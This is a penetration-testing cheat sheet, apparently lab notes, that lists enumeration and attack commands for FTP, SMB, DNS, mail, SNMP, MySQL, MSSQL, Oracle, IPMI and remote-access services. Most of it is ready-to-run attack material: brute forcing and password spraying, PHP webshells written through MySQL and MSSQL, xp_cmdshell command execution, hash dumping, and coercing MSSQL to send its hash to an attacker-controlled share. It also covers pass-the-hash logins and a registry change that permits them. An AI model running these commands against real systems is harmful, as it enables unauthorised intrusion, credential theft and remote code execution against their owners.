## Host and Service Enumeration Cheat Sheet

### Host Discovery
````
$ nmap 192.168.1.1/24 -sn
$ nmap 192.168.1.1/24 -Pn
$ [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
$ for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
$ fping -asgq 172.16.5.0/23
$ arp-scan 192.168.1.0/24
$ for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply" (Windows cmd)
$ 1..254 | % {"172.16.5.$($_): $(Test-Connection count 1 -comp 172.15.5.$($_) -quiet)"} (Powershell)
````

### Host Enumeration
````
$ nmap 192.168.1.1 -sS -p- IP -vv
$ nmap 192.168.1.1 -sV -p- IP -vv
$ nmap 192.168.1.1 -sV -pPORT IP -vv
$ nmap 192.168.1.1 -sS -p- IP -oA output_scan -vv
````

### FTP
````
$ sudo nmap -sV -p21 -sC -A 10.129.14.136 (Verify if anonymous user is allowed)
$ ftp 10.129.14.136 (Connection)
$ ftp 10.129.14.136 (Username: anonymous | Password: Empty (Enter) )
ftp> ls (List directory)
ftp> ls -R (Recursive Listing)
ftp> get <file_to_download> (Download a file)
$ wget -m --no-passive ftp://anonymous:anonymous@<IP> (Download All Available Files)
ftp> put <file_to_upload>  (Upload a file)
````
**Attack**
````
$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h IP -M ftp
$ hydra -l <userZ -P passwords IP ftp
$ hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://<IP>
````

### SMB
````
$ sudo nmap 10.129.14.128 -sV -sC -p139,445
$ smbclient -N -L //10.129.14.128 (Connect with Null Session)
$ smbclient //10.129.14.128/<share> (Connect to specific share)
$ smbclient \\\\<IP>\\'<Share>' -U '<USER>' (Connect with user)
smb: \> get <file_to_download> (Download a file)
smb: \> put <localfile.txt> <remotefile.txt>
$ samrdump.py <FQDN/IP> (Username enumeration using Impacket scripts.)
$ smbmap -H <FQDN/IP> (Enumerating SMB shares with smbmap)
$ smbmap -H <FQDN/IP> -r notes (List specific share with smbmap)
$ smbmap -H <FQDN/IP> --download "<share>\<file>" (Download a file with smbmap)
$ smbmap -H <FQDN/IP> --upload <file_to_upload> "<share>\<file_to_upload>" (Upload a file with smbmap)
$ nxc smb <FQDN/IP> -u '' -p '' --shares (Netexec shares enumerate with null session)
$ nxc smb <FQDN/IP> -u '<user>' -p '<password>' --shares (Netexec shares enumerate with user account)
$ enum4linux-ng <FQDN/IP> -A (SMB enumeration using enum4linux.)
$ enum4linux-ng <IP> -A -C
$ rpcclient -U "" <FQDN/IP> (Interaction with the target using RPC with null session)
$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done (Brute Force RID)
````
**Attack**
````
$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>' --local-auth (Password Spraying Non-domain joined)
$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>' --local-auth --continue-on-success (Password Spraying Non-domain joined)
$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>'  (Password Spraying Domain Joined)
$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>'  --continue-on-success (Password Spraying Domain Joined)
$ nxc smb 10.10.110.0/24 -u <user> -p '<password>' --loggedon-users (Enumerating Logged-on Users)
$ nxc smb <IP> -u <user> -p '<password>' --sam (Extract Hashes from SAM Database)
$ nxc smb <IP> -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8F (Use Hash NTLM)
````

### NFS
````
$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC
$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
$ showmount -e <FQDN/IP> (Show available NFS shares.)
$ sudo mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock (Mount the specific NFS share to ./target-NFS)
$ sudo umount ./target-NFS (Unmount the specific NFS share.)
````

### DNS
````
$ dig ns <domain.tld> @<nameserver> (NS request to the specific nameserver.)
$ dig any <domain.tld> @<nameserver> (ANY request to the specific nameserver.)
$ dig axfr <domain.tld> @<nameserver> (AXFR request to the specific nameserver.)
$ dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld> (Subdomain brute forcing with dnsenum)
$ for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.<domain> @<nameserver> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
$ subfinder -d domain (Subdomain enum with subfinder)
$ python3 sublist3r.py -d <domain-name> -n (Subdomain enum with sublister)
$ ffuf -u "http://FUZZ.domain" -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt (Subdomain enum with ffuf)
````
**Attack**
````
Subdomain takeover: https://github.com/EdOverflow/can-i-take-over-xyz
````

### SMTP
````
$ sudo nmap 10.129.14.128 -sC -sV -p25
$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v (Verify if open-relay is open)
$ telnet <FQDN/IP> 25 (Connect to smtp service)
$ VRFY root (Verify if user exist)
````
**Attack**
````
$ smtp-user-enum -M RCPT -U userlist.txt -D <domain> -t <IP> (User enumeration via smtp server)
$ python3 o365spray.py --validate --domain msplaintext.xyz
$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
$ hydra -L users.txt -p '<Password>' -f IP smtp (We can use this command against pop3 and imap)
$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
smtp-user-enum: https://github.com/pentestmonkey/smtp-user-enum
o365spray: https://github.com/0xZDH/o365spray
````
### IMAP & POP3
````
$ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
$ curl -k 'imaps://<FQDN/IP>' --user <user>:<password> (Log in to the IMAPS service using cURL.)
$ openssl s_client -connect <FQDN/IP>:imaps (Connect to the IMAPS service.)
$ openssl s_client -connect <FQDN/IP>:pop3s ( Connect to the POP3s service.)
$ telnet <IP> 110 (Connect without encryption)
$ hydra -L users.txt -p '<Password>' -f IP pop3/imap
````
**Example IMAPS**
````
$ openssl s_client -connect <IP>:imaps (Connect)
a login <user> <password> (Login)
a list "" * (List mailboxes)
select DEV.DEPARTMENT.INT (Select mailbox)
A FETCH 1 ALL (Dump the emails content)
------------------------------------------------
$ openssl s_client -connect 10.129.245.182:imaps
a login <user> <password>
a list "" *
select DEV.DEPARTMENT.INT
a status DEV.DEPARTMENT.INT (MESSAGES UNSEEN RECENT)
A1 UID FETCH 1 (UID RFC822.SIZE BODY.PEEK[])
````
**Example POP3**
````
$ telnet <IP> 110
$ USER <user>
$ PASS <password>
$ LIST
$ RETR 1
````

### SNMP
````
$ sudo nmap 10.129.14.128 -sV -sU -p161,162
$ snmpwalk -v2c -c public 10.129.14.128 (Querying OIDs using snmpwalk.)
$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <IP> (Bruteforcing community strings of the SNMP service.)
$ braa <community string>@<FQDN/IP>:.1.* (Bruteforcing SNMP service OIDs.)
````

### MySQL
````
$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
$ mysql -u <User> -p -h <IP> (Connect to mysql server)
show databases;	(Show all databases.)
use <database>;	(Select one of the existing databases.)
show tables;	(Show all available tables in the selected database.)
show columns from <table>;	(Show all columns in the selected table.)
select * from <table>;	(Show everything in the desired table.)
select * from <table> where column = "string";	(Search for needed string in the desired table.)
````
**Attack**
````
- Write a file -
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
- Enumerate Privileges -
mysql> show variables like "secure_file_priv";
- Read a file -
mysql> select LOAD_FILE("/etc/passwd");
````

### MSSQL
````
$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
$ python3 mssqlclient.py <USER>@<IP> -windows-auth
$ impacket-mssqlclient <USER>@<IP> -windows-auth
$ impacket-mssqlclient DOMAIN/<USER>@<IP>
$ impacket-mssqlclient '<user>:<pass>@<ip>' -windows-auth
````
**Attack**
````
sqsh -S <IP> -U <user> -P '<Password>' -h (Autenticate with sqsh)
sqsh -S <IP> -U .\\<user> -P 'MyPassword!' -h (Target local account)
----------------------------------------------------------------------------
Enumerate DB
If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
1> SELECT name FROM master.dbo.sysdatabases (Show all databases)
2> GO
1> USE database
2> GO
1> SELECT table_name FROM <database>.INFORMATION_SCHEMA.TABLES (Show tables of the selected database)
2> GO
1> SELECT * FROM users (Dump data of users's table)
2> go
--------------------------------------------------------------------------------
Executing Commands
1> xp_cmdshell 'whoami'
2> GO
If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
If you are using impacket-mssqlclient, just run the following command and tools will automatically execute the previous commands to activate xp_cmdshell:
> enable_xp_cmdshell
----------------------------------------------------------------------------------
Write a file
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
-------------------------------------------------------------------------------------
Read a file
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
-------------------------------------------------------------------------------------
Capture MSSQL Service Hash
1> EXEC master..xp_dirtree '\\<IP-Attacker>\share\'
2> GO
or
1> EXEC master..xp_subdirs '\\<IP-Attacker>\share\'
2> GO
$ sudo responder -I tun0
$ sudo impacket-smbserver share ./ -smb2support
-------------------------------------------------------------------------------------
Impersonate Existing Users
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO  (List Users)

1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
-------------------------------------------------------------------------------------
Communicate with Other Databases
- Identify linked Servers -
1> SELECT srvname, isremote FROM sysservers
2> GO
Where 1 means is a remote server, and 0 is a linked server.
- Execute query in Linked Server -
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<Linked_Server>]
2> go
- Execute Commands -
1> EXECUTE('xp_cmdshell ''whoami''') AT [<Linked_Server>]
2> go
````

### Oracle Tns
````
$ sudo nmap -p1521 -sV 10.129.204.235 --open
$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
$ ./odat.py all -s <IP>
$ sqlplus <user>/<pass>@<FQDN/IP>/<db>
$ sqlplus <USER>/<PASS>@<IP>/<SID> as sysdba (Login as sysdba)
SQL> select name, password from sys.user$; (Extract Password Hashes)
SQL> select * from user_role_privs; (Privileges)
SQL> select table_name from all_tables;
$./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt (File Upload)
````

### IPMI
````
$ sudo nmap -sU --script ipmi-version -p 623 <IP>
msf6 auxiliary(scanner/ipmi/ipmi_version) (IPMI version detection.)
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) (Dump IPMI hashes.)
hashcat hash_dumped /usr/share/wordlists/rockyou.txt (Crack hash with hashcat)
````

### Remote Management
**Linux**
````
$ ssh <user>@<FQDN/IP> (Login ssh with user)
$ ssh -i private.key <user>@<FQDN/IP> (Login ssh with private key)
````
**Attack**
````
$ hydra -L usernames.txt -p 'password123' <IP> ssh
````

**Windows**
````
$ xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP> (RDP with xfreerdp)
$ xfreerdp3 /v:<FQDN/IP> /u:<user> /p:'<password>'
$ xfreerdp3 /v:<FQDN/IP> /u:<user> /pth:'<hash_ntlm>' (RDP with pass the hash)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f (Register Key to allow rdp with hash ntlm)
$ rdesktop <FQDN/IP> -u '<user>' -p '<password>'
$ evil-winrm -i <FQDN/IP> -u <user> -p <password> (Login with evil-wirm)
$ evil-winrm -i <FQDN/IP> -u <user> -H <hash_ntlm> (Login with evil-wirm with hash ntlm)
$ wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>" (Execute command using the WMI service.)
$ impacket-psexec <Domain>/<user>:<password>@<IP>
$ impacket-psexec <user>:'<password>'@<IP>
````
**Attack**
````
$ crowbar -b rdp -s <IP>/32 -U users.txt -c 'password123' (Brute Force Rdp)
$ hydra -L usernames.txt -p 'password123' <IP> rdp
````







